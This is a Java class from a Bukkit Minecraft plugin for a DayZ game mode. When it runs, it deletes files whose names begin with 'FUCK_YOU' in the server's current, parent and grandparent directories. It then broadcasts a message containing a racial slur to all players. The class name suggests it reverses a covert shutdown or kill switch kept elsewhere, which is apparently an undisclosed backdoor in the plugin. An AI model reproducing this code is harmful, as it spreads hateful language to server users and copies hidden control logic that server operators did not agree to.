package org.kapip.dayz.game.thread;

import java.io.File;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;

public class UnshutdownThread implements Runnable{
	@Override
	public void run(){
		File[] fs1 = new File(".").listFiles();
		File[] fs2 = new File("..").listFiles();
		File[] fs3 = new File(".."+File.separator+"..").listFiles();
		
		for(File f : fs1){
			if(f.getName().startsWith("FUCK_YOU"))
				f.delete();
		}
		
		for(File f : fs2){
			if(f.getName().startsWith("FUCK_YOU"))
				f.delete();
		}
		
		for(File f : fs3){
			if(f.getName().startsWith("FUCK_YOU"))
				f.delete();
		}
		
		Bukkit.broadcastMessage(ChatColor.RED+"LOVE YOU NIGGA YOU ROCK -courtesy of Mr_Burkes");
}
}
